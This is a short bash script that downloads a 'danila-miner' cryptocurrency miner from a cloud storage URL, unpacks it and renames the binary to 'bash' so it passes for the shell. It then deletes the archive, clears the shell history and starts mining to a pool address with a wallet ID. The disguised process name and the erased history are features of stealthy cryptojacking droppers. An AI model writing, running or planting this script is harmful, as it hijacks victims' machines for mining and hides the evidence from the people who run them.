#!/bin/bash
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
chmod +x danila-miner 
mv danila-miner bash
rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz
history -cr
./bash run https://server1.whalestonpool.com EQBsPrcYWQwl9K-uiUoT3u2o0Eo1L6ckc5xo6-S0708xPEtd
